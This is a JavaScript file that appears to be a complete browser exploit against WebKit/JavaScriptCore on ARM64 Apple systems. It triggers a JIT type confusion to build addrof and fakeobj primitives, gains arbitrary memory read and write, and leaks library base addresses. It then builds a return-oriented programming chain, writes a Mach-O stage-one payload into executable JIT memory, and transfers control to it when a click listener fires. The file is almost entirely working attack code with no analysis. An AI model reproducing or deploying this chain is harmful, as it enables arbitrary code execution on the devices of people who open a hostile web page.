class Base extends Function {
    constructor() {
        super();
        super.prototype = 1;
    }
}

var structs = [];
for (var i = 0; i < 0x1000; i++) {
    var a = new Float64Array(1);
    a['prop' + i] = 1337;
    structs.push(a);
}


// address leak
function addrofOnce(obj){
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[0] = 1.1;
    let trigger = false;
    const b = new Base();

    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });

    function jitme(a, flag) {
        a[0] = 1.1; 
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        return a[1];
    }
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false); // JITting...
    }
    trigger = true;
    arr[0] = b.prototype;
    let addr = Int64.fromDouble(jitme(confuse, true));
    return addr;
}


function fakeobjOnce(addr){
    addr = Number(addr);
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[1] = 1.1;
    let trigger = 0;
    const b2 = new Base();

    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });

    function jitme(a, flag, f64arr, u32arr) {
        a[0] = 1.1; 
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        f64arr[0] = f64arr[1] = a[1];
        // u32arr[3] = 1; //temp
        // if(flag)
        //     debug(u32[3])
        u32arr[2] = addr;
        a[1] = f64arr[1];
    }

    let u32arr = new Uint32Array(4);
    let f64arr = new Float64Array(u32arr.buffer);
    
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false, f64arr, u32arr); // JITting...
    }

    trigger = 1;
    arr[0] = b2.prototype;
    jitme(confuse, true, f64arr, u32arr);
    return confuse[1];
}

function addrofOnce2(obj){
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[0] = 1.1;
    let trigger = false;
    const b = new Base();

    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });

    function jitme(a, flag) {
        a[0] = 1.1; 
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        return a[1];
    }
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false); // JITting...
    }
    trigger = true;
    arr[0] = b.prototype;
    let addr = Int64.fromDouble(jitme(confuse, true));
    return addr;
}


function fakeobjOnce2(addr){
    addr = Number(addr);
    var arr = [1.1, 2.2, 3.3];
    var confuse = new Array(1.1, 2.2, 3.3);
    confuse[1] = 1.1;
    let trigger = 0;
    const b2 = new Base();

    Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
    b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });

    function jitme(a, flag, f64arr, u32arr) {
        a[0] = 1.1; 
        a[1] = 2.2;
        if(flag) {
            [...arr];
        }
        f64arr[0] = f64arr[1] = a[1];
        // u32arr[3] = 1; //temp
        // if(flag)
        //     debug(u32[3])
        u32arr[2] = addr;
        a[1] = f64arr[1];
    }

    let u32arr = new Uint32Array(4);
    let f64arr = new Float64Array(u32arr.buffer);
    
    for(var i = 0; i < 0x100000; i++){
        jitme(confuse, false, f64arr, u32arr); // JITting...
    }

    trigger = 1;
    arr[0] = b2.prototype;
    jitme(confuse, true, f64arr, u32arr);
    return confuse[1];
}

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(val) { 
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val) {
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function i2obj(val) {
    return i2f(val-0x02000000000000);
}

function LeakStructureID(obj) {
    let container = {
        cellHeader: i2obj(0x0108200700000000),
        butterfly: obj
    };
    let fakeObjAddr = (Add(addrofOnce(container), 0x10)); // 16
    let fakeObj = fakeobjOnce(fakeObjAddr);
    f64[0] = fakeObj[0];
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];
    return structureID;
}

function MakeJitCompiledFunction() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

function millis(ms)
{
	var t1 = Date.now();
    while(Date.now() - t1 < ms)
    {
    	//Simply wait
    }
}

var zero8 = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0])


function b2u32(b) {
    return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
}

function off2addr(segs, off)
{
    if(!(off instanceof Int64)) off = new Int64(off);
    for(var i = 0; i < segs.length; ++i)
    {
        var start = segs[i].fileoff;
        var end   = Add(start, segs[i].size);
        if
        (
            (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
            (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
        )
        {
            return Add(segs[i].addr, Sub(off, start));
        }
    }
    return new Int64("0x4141414141414141");
}

function fsyms(mem, base, segs, want, syms)
{
    want = Array.from(want); // copy
    if(syms === undefined)
    {
        syms = {};
    }
    var stab = null;
    var ncmds = mem.u32(Add(base, 0x10));
    for(var i = 0, off = 0x20; i < ncmds; ++i)
    {
        var cmd = mem.u32(Add(base, off));
        if(cmd == 0x2) // LC_SYMTAB
        {
            var b = mem.read(Add(base, off + 0x8), 0x10);
            stab =
            {
                symoff:  b2u32(b.slice(0x0, 0x4)),
                nsyms:   b2u32(b.slice(0x4, 0x8)),
                stroff:  b2u32(b.slice(0x8, 0xc)),
                strsize: b2u32(b.slice(0xc, 0x10)),
            };
            break;
        }
        off += mem.u32(Add(base, off + 0x4));
    }
    if(stab == null)
    {
        log("fail: stab");
    }
    var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
    var fn = function(i)
    {
        return mem.read(Add(tmp.base, tmp.off + i), 1)[0];
    };
    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
    {
        tmp.off = mem.u32(off2addr(segs, stab.symoff + i * 0x10));
        for(var j = 0; j < want.length; ++j)
        {
            var s = want[j];
            if((strcmp(fn, s)))
            {
                syms[s] = mem.readInt64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
                want.splice(j, 1);
                break;
            }
        }
    }
    return syms;
}

function _u32(i) {
    return b2u32(this.read(i, 4));
}

function _read(i, l)
{
    if (i instanceof Int64) i = i.lo();
    if (l instanceof Int64) l = l.lo();
    if (i + l > this.length)
    {
        log(`fail: OOB read: ${i} -> ${i + l}, size: ${l}`);
    }
    return this.slice(i, i + l);
}
function _readInt64(addr)
{
    return new Int64(this.read(addr, 8));
}
function _writeInt64(i, val)
{
    if (i instanceof Int64) i = i.lo();
    this.set(val.bytes(), i);
}

function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            return false;
        }
    }
    return fn(str.length) == 0;
}

function pwn() {

    let noCoW = 13.37;
    var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    let structureID = LeakStructureID(arrLeak);
    log("[+] leak structureID: "+(structureID));

    pad = [{}, {}, {}];
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_1'] = 13.37;

    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;

    var container = {
        cellHeader: f64[0],
        butterfly: victim   
    };

    // build fake driver
    var containerAddr = addrofOnce2(container);
    var fakeArrAddr = Add(containerAddr, 0x10); // 16//containerAddr + 0x10;
    var driver = fakeobjOnce2(fakeArrAddr);

    // ArrayWithDouble
    var unboxed = [noCoW, 13.37, 13.37];
    // ArrayWithContiguous
    var boxed = [{}];

    // leak unboxed butterfly's addr
    driver[1] = unboxed;
    var sharedButterfly = victim[1];
    log("[+] shared butterfly addr: " + Int64.fromDouble(sharedButterfly));

    driver[1] = boxed;
    victim[1] = sharedButterfly;

    // set driver's cell header to double array
    u32[0] = structureID;
    u32[1] = 0x01082307-0x20000;
    container.cellHeader = f64[0];

    function addrof(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    }
    
    function fakeobj(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];            
    }    

    function read64(addr) {
        driver[1] = i2f(addr+0x10);
        return addrof(victim.prop);
    }
    
    function write64(addr, val) {
        driver[1] = i2f(addr+0x10);
        victim.prop = fakeobj(val);
    }

    function ByteToDwordArray(payload)
    {
        let sc = []
        let tmp = 0;
        let len = Math.ceil(payload.length/6)
        for (let i = 0; i < len; i += 1) {
            tmp = 0;
            pow = 1;
            for(let j=0; j<6; j++){
                let c = payload[i*6+j]
                if(c === undefined) {
                    c = 0;
                }
                pow = j==0 ? 1 : 256 * pow;
                tmp += c * pow;
            }
            tmp += 0xc000000000000;
            sc.push(tmp);
        }
        return sc;
    }

    function ArbitraryWrite(addr, payload) 
    {
        let sc = ByteToDwordArray(payload);
        for(let i=0; i<sc.length; i++) {
            write64(addr+i*6, sc[i]);
        }
    }

    var malloc_nogc = [];
    function malloc(sz) {
        var arr = new Uint8Array(sz);
        malloc_nogc.push(arr);
        return read64(addrof(arr) + 0x10);
    }

    //let the fun begin!
    let myOBJ = {a: 0x1337};
    let myOBJAddr = addrof(myOBJ);
    log(`[*] myOBJAddr = ${(myOBJAddr)}`); 

    let fakeOBJ = fakeobj(myOBJAddr);
    log(`[*] fakeOBJ = ${(fakeOBJ.a)}`); 

    let myOBJ2 = {b: 0x4141};
    let myOBJAddr2 = addrof(myOBJ2);
    log(`[*] myOBJAddr2 = ${(myOBJAddr2)}`); 

    let fakeOBJ2 = fakeobj(myOBJAddr2);
    log(`[*] fakeOBJ2 = ${(fakeOBJ2.b)}`); 
 
    var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
    var FPO = spectre ? 0x18 : 0x10; 
    log(`[*] FPO: ${FPO}`);
    
    var wrapper = document.createElement('div');
    var wrapper_addr = addrof(wrapper);
    log(`[*] wrapper_addr = ${(wrapper_addr).toString(16)}`); 
    var el_addr = read64(wrapper_addr + FPO);
    log(`[*] el_addr = ${(el_addr).toString(16)}`); 
    var vtab_addr = read64(el_addr);
    log(`[*] vtab_addr = ${(vtab_addr).toString(16)}`); 
    
    var webcore_base = vtab_addr - 0x234b04c;
    log(`[+] webcore base = ${(webcore_base).toString(16)}`); 
    var read_webcore = read64(webcore_base);
    log(`[i] webcore read test = ${read_webcore.toString(16)}`);
    var libdyld_base = webcore_base - 0xea87000;
    log(`[+] libdyld_base = ${(libdyld_base).toString(16)}`); 
    var read_libdyld_base = read64(libdyld_base);
    log(`[i] libdyld read test = ${read_libdyld_base.toString(16)}`);
    var __ZN5dyld45gDyldE = read64(libdyld_base + 0x7483c0c8);
    log(`[i] __ZN5dyld45gDyldE = ${__ZN5dyld45gDyldE.toString(16)}`);
    var __ZN5dyld44APIs6dlopenEPKci = read64(read64(__ZN5dyld45gDyldE) + 0x70)
    log(`[i] __ZN5dyld44APIs6dlopenEPKci = ${__ZN5dyld44APIs6dlopenEPKci.toString(16)}`);
    var dyld_base = __ZN5dyld44APIs6dlopenEPKci - 0x6bec;
    log(`[i] dyld_base = ${dyld_base.toString(16)}`);
    var mrs_TPIDRRO_EL0 = dyld_base + 0x68660;
    log(`[i] mrs_TPIDRRO_EL0 = ${mrs_TPIDRRO_EL0.toString(16)}`);
    var ldr_0x38_TPIDRRO_EL0 = read64(mrs_TPIDRRO_EL0 + 0x38)
    log(`[i] ldr_0x38_TPIDRRO_EL0 = ${ldr_0x38_TPIDRRO_EL0.toString(16)}`);
    // write64(mrs_TPIDRRO_EL0 + 0x38, 0)
    ArbitraryWrite(mrs_TPIDRRO_EL0 + 0x38, zero8);  //need to be 0 because __longjmp do EOR performed
    var liblzma5_base = webcore_base + 0x4bbfe000;
    log(`[i] liblzma5_base read test = ${read64(liblzma5_base).toString(16)}`);
    var libxml2_base = webcore_base + 0x4c496000;
    log(`[i] libxml2_base read test = ${read64(libxml2_base).toString(16)}`);
    var libcpp1_base = webcore_base + 0x9060000;
    log(`[i] libcpp1_base read test = ${read64(libcpp1_base).toString(16)}`);
    var jsc_base = webcore_base - 0x3ff3000;
    log(`[i] jsc_base read test = ${read64(jsc_base).toString(16)}`);
    var libsystem_kernel_base = webcore_base + 0x2bfbd000;
    log(`[i] libsystem_kernel_base read test = ${read64(libsystem_kernel_base).toString(16)}`);
    var jsc_g_config = jsc_base + 0x69f75000;
    log(`[i] jsc_g_config = ${jsc_g_config.toString(16)}`);
    var memPoolStart = read64(jsc_g_config + 0x1b8);
    var memPoolEnd = read64(jsc_g_config + 0x1c0);
    var jitWriteSeparateHeaps = read64(jsc_g_config + 0x1d0);
    log(`[i] memPoolStart = ${memPoolStart.toString(16)}`);
    log(`[i] memPoolEnd = ${memPoolEnd.toString(16)}`);
    log(`[i] jitWriteSeparateHeaps = ${jitWriteSeparateHeaps.toString(16)}`);

    //dyld func 
    var libsystem_platform_base = webcore_base + 0x4ca27000;
    var longjmp = libsystem_platform_base + 0x2b64;
    var usleep = webcore_base + 0x21a5d64;
    var mach_vm_protect = libsystem_kernel_base + 0x9f0;
    var mach_task_self_ = read64(libsystem_kernel_base + 0x39df6424);

    //gadgets
    var stackloader = new Int64(liblzma5_base + 0x4020);
    var ldrx8 = new Int64(webcore_base + 0x213bf30);
    var dispatch = new Int64(libxml2_base + 0x1f32c);
    var movx4 = new Int64(libcpp1_base + 0x1d010);
    var regloader = new Int64(libcpp1_base + 0x33440);

    //WebCore::jsEventTargetPrototypeFunction_addEventListener(JSC::JSGlobalObject *,JSC::CallFrame *)+B4
    var x19 = malloc(0x100) //refers _longjmp's prologoue: 0x1dd8dbb64 <+0>:  ldp    x19, x20, [x0]...
    var x8 = malloc(0x8)
    write64(wrapper_addr + FPO + 8, new Int64(x19));
    write64(x19, x8)
    write64(x8, new Int64(longjmp));

    log(`[+] addEventListener's x19 @ ${x19.toString(16)}`);
    log(`[+] addEventListener's x8 @ ${x8.toString(16)}`);

    stage1.u32 = _u32;
    stage1.read = _read;
    stage1.readInt64 = _readInt64;
    stage1.writeInt64 = _writeInt64;
    var pstart = new Int64("0xffffffffffffffff");
    var pend   = new Int64(0);
    var ncmds  = stage1.u32(0x10);
    for(var i = 0, off = 0x20; i < ncmds; ++i)
    {
        var cmd = stage1.u32(off);
        if(cmd == 0x19) // LC_SEGMENT_64
        {
            var filesize = stage1.readInt64(off + 0x30);
            if(!(filesize.hi() == 0 && filesize.lo() == 0))
            {
                var vmstart = stage1.readInt64(off + 0x18);
                var vmsize = stage1.readInt64(off + 0x20);
                var vmend = Add(vmstart, vmsize);
                if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() <= pstart.lo()))
                {
                    pstart = vmstart;
                }
                if(vmend.hi() > pend.hi() || (vmend.hi() == pend.hi() && vmend.lo() > pend.lo()))
                {
                    pend = vmend;
                    
                }
            }
        }
        off += stage1.u32(off + 0x4);
    }
    var shsz = Sub(pend, pstart);
    log(`pstart: ${pstart}, pend: ${pend}, shsz: ${shsz}`);
    if(shsz.hi() != 0)
    {
        log("fail: shsz");
    }
    var payload = new Uint8Array(shsz.lo());
    var paddr = read64(addrof(stage1) + 0x10);
    paddr = new Int64(paddr);
    var codeAddr = Sub(memPoolEnd, shsz);
    codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
    var shslide = Sub(codeAddr, pstart);
    segs = [];
    var off = 0x20;
    for(var i = 0; i < ncmds; ++i)
    {
        var cmd = stage1.u32(off);
        if(cmd == 0x19) // LC_SEGMENT_64
        {
            var filesize = stage1.readInt64(off + 0x30);
            if(!(filesize.hi() == 0 && filesize.lo() == 0))
            {
                var vmaddr   = stage1.readInt64(off + 0x18);
                var vmsize   = stage1.readInt64(off + 0x20);
                var fileoff  = stage1.readInt64(off + 0x28);
                var prots    = stage1.readInt64(off + 0x38); // lo=init_prot, hi=max_prot
                if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() <= filesize.lo()))
                {
                    filesize = vmsize;
                }
                segs.push({
                    addr:    Sub(vmaddr, pstart),
                    size:    filesize,
                    fileoff: fileoff,
                    prots:   prots,
                });
                if(fileoff.hi() != 0)
                {
                    log("fail: fileoff");
                }
                if(filesize.hi() != 0)
                {
                    log("fail: filesize");
                }
                fileoff = fileoff.lo();
                filesize = filesize.lo();
                payload.set(stage1.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
            }
        }
        off += stage1.u32(off + 0x4);
    }

    payload.u32 = _u32;
    payload.read = _read;
    payload.readInt64 = _readInt64;
    var psyms = fsyms(payload, 0, segs, ["__start"]);
    
    ////////////////////////
    var arrsz = 0x100000,
        off   =   0x1000;
    var arr   = new Uint32Array(arrsz);
    var stack = read64(addrof(arr) + 0x10);
    var pos = arrsz - off;

    var add_call_via_x8 = function(func, x0, x1, x2, x3, x4, jump_to) {
        log(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);
        //x4 = x4 || Int64.One
        // in stackloader:
        arr[pos++] = 0xdead0010;                // unused
        arr[pos++] = 0xdead0011;                // unused
        arr[pos++] = 0xdead0012;                // unused
        arr[pos++] = 0xdead0013;                // unused
        arr[pos++] = 0xdead1101;                // x28 (unused)
        arr[pos++] = 0xdead1102;                // x28 (unused)
        arr[pos++] = 0xdead0014;                // x27 == x6 (unused)
        arr[pos++] = 0xdead0015;                // x27 == x6 (unused)
        arr[pos++] = 0xdead0016;                // x26 (unused)
        arr[pos++] = 0xdead0017;                // x26 (unused)
        arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
        arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
        arr[pos++] = x0.lo();                   // x24 == x0 (arg1)
        arr[pos++] = x0.hi();                   // x24 == x0 (arg1)
        arr[pos++] = x2.lo();                   // x23 == x2 (arg3)
        arr[pos++] = x2.hi();                   // x23 == x2 (arg3)
        arr[pos++] = x3.lo();                   // x22 == x3 (arg4)
        arr[pos++] = x3.hi();                   // x22 == x3 (arg4)
        arr[pos++] = func.lo();                 // x21 (target for dispatch)
        arr[pos++] = func.hi();                 // x21 (target for dispatch)
        arr[pos++] = 0xdead0018;                // x20 (unused)
        arr[pos++] = 0xdead0019;                // x20 (unused)
        var tmppos = pos;
        arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
        arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
        arr[pos++] = 0xdead001c;                // x29 (unused)
        arr[pos++] = 0xdead001d;                // x29 (unused)
        arr[pos++] = ldrx8.lo();                // x30 (next gadget)
        arr[pos++] = ldrx8.hi();                // x30 (next gadget)

        // in ldrx8
        if (x4) {
            arr[pos++] = stackloader.lo();
            arr[pos++] = stackloader.hi();
        } else {
            arr[pos++] = dispatch.lo();             // x8 (target for regloader)
            arr[pos++] = dispatch.hi();             // x8 (target for regloader)
        }
        arr[pos++] = 0xdead1401;                // (unused)
        arr[pos++] = 0xdead1402;                // (unused)
        arr[pos++] = 0xdead1301;                // x20 (unused)
        arr[pos++] = 0xdead1302;                // x20 (unused)
        arr[pos++] = x1.lo();                   // x19 == x1 (arg2)
        arr[pos++] = x1.hi();                   // x19 == x1 (arg2)
        arr[pos++] = 0xdead1201;                // x29 (unused)
        arr[pos++] = 0xdead1202;                // x29 (unused)
        arr[pos++] = regloader.lo();            // x30 (next gadget)
        arr[pos++] = regloader.hi();            // x30 (next gadget)

        // in regloader
        // NOTE: REGLOADER DOES NOT ADJUST SP!
        // sometimes i didn't get expected value in x4
        // and i have no fucking idea why
        // usleep likely did the trick, but I would still keep the code
        // with movx4
        // arr[pos++] = x4.lo()                    // x4 (should be -- but see lines above)
        // arr[pos++] = x4.hi()                    // x4 (should be -- but see lines above)

        if (x4) {
            // in stackloader:
            arr[pos++] = 0xdaad0010;                // unused
            arr[pos++] = 0xdaad0011;                // unused
            arr[pos++] = 0xdaad0012;                // unused
            arr[pos++] = 0xdaad0013;                // unused
            arr[pos++] = 0xdaad1101;                // x28 (unused)
            arr[pos++] = 0xdaad1102;                // x28 (unused)
            arr[pos++] = 0xdaad0014;                // x27 == x6 (unused)
            arr[pos++] = 0xdaad0015;                // x27 == x6 (unused)
            arr[pos++] = 0xdaad0016;                // x26 (unused)
            arr[pos++] = 0xdaad0017;                // x26 (unused)
            arr[pos++] = 0xdaad0018;                // x25 (unused)
            arr[pos++] = 0xdaad0019;                // x25 (unused)
            arr[pos++] = 0xdaad00f0;                // x24 (unused)
            arr[pos++] = 0xdaad00f1;                // x24 (unused)
            arr[pos++] = 0xdaad00f2;                // x23 (unused)
            arr[pos++] = 0xdaad00f3;                // x23 (unused)
            arr[pos++] = 0xdaad00f4;                // x22 (unused)
            arr[pos++] = 0xdaad00f5;                // x22 (unused)
            arr[pos++] = func.lo();                 // x21 (target for dispatch)
            arr[pos++] = func.hi();                 // x21 (target for dispatch)
            arr[pos++] = 0xdaad0018;                // x20 (unused)
            arr[pos++] = 0xdaad0019;                // x20 (unused)
            tmppos = pos;
            arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
            arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
            arr[pos++] = 0xdaad001c;                // x29 (unused)
            arr[pos++] = 0xdaad001d;                // x29 (unused)
            arr[pos++] = ldrx8.lo();                // x30 (next gadget)
            arr[pos++] = ldrx8.hi();                // x30 (next gadget)

            // in ldrx8
            arr[pos++] = dispatch.lo();             // x8 (target for movx4)
            arr[pos++] = dispatch.hi();             // x8 (target for movx4)
            arr[pos++] = 0xdaad1401;                // (unused)
            arr[pos++] = 0xdaad1402;                // (unused)
            arr[pos++] = x4.lo();                   // x20 == x4 (arg5)
            arr[pos++] = x4.hi();                   // x20 == x4 (arg5)
            arr[pos++] = 0xdaad1301;                // x19 (unused)
            arr[pos++] = 0xdaad1302;                // x19 (unused)
            arr[pos++] = 0xdaad1201;                // x29 (unused)
            arr[pos++] = 0xdaad1202;                // x29 (unused)
            arr[pos++] = movx4.lo();                // x30 (next gadget)
            arr[pos++] = movx4.hi();                // x30 (next gadget)
        }

        // after dispatch:

        // keep only one: these or 0xdeaded01
        arr[pos++] = 0xdead0022;                // unused
        arr[pos++] = 0xdead0023;                // unused

        arr[pos++] = 0xdead0022;                // unused
        arr[pos++] = 0xdead0023;                // unused
        arr[pos++] = 0xdead0024;                // x22 (unused)
        arr[pos++] = 0xdead0025;                // x22 (unused)
        arr[pos++] = 0xdead0026;                // x21 (unused)
        arr[pos++] = 0xdead0027;                // x21 (unused)
        arr[pos++] = 0xdead0028;                // x20 (unused)
        arr[pos++] = 0xdead0029;                // x20 (unused)
        arr[pos++] = 0xdead002a;                // x19 (unused)
        arr[pos++] = 0xdead002b;                // x19 (unused)
        arr[pos++] = 0xdead002c;                // x29 (unused)
        arr[pos++] = 0xdead002d;                // x29 (unused)
        arr[pos++] = jump_to.lo();              // x30 (gadget)
        arr[pos++] = jump_to.hi();              // x30 (gadget)
    }

    var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {
        x0 = x0 || Int64.Zero
        x1 = x1 || Int64.Zero
        x2 = x2 || Int64.Zero
        x3 = x3 || Int64.Zero
        jump_to = jump_to || stackloader

        return add_call_via_x8(func, x0, x1, x2, x3, x4, jump_to)
    }

    add_call(new Int64(jitWriteSeparateHeaps)
        , Sub(codeAddr, memPoolStart)     // off
        , paddr                           // src
        , shsz                            // size
    );

    segs.forEach(function(seg) {
        var addr = Add(seg.addr, codeAddr);
        if (seg.prots.hi() & 2) { // VM_PROT_WRITE
            var addr = Add(seg.addr, codeAddr);
            log(`Calling mach_vm_protect, ${mach_vm_protect.toString(16)}, ${mach_task_self_ >>> 0} ${addr} ${seg.size} 0 0x13`);
            add_call(new Int64(mach_vm_protect)
                , new Int64(mach_task_self_ >>> 0)    // task
                , addr                                // addr
                , seg.size                          // size
                , new Int64(0)                      // set maximum
                , new Int64(0x13)                   // prot (RW- | COPY)
            );
        }
    })

    add_call(new Int64(usleep)
        , new Int64(100000) // microseconds
    );

    var jmpAddr = Add(psyms["__start"], shslide);
    add_call(jmpAddr
        , new Int64(0xcafebabe41414140) //x0
        , new Int64(0xcafebabe41414144) //x1
        , new Int64(0xcafebabe41414148) //x2
        , new Int64(0xcafebabe4141414c) //x3
        , new Int64(0xcafebabe41414150) //x4
    );

    // dummy
    for(var i = 0; i < 0x20; ++i)
    {
            arr[pos++] = 0xde00c0de + (i<<16);
    }

    //set longjmp's register
    write64(x19 + 0x58, new Int64(stackloader));
    var sp = Add(stack, (arrsz - off) * 4);
    write64(x19 + 0x60, new Int64(sp));

    alert("Done!");
   
    wrapper.addEventListener("click", function(){ }); 
}
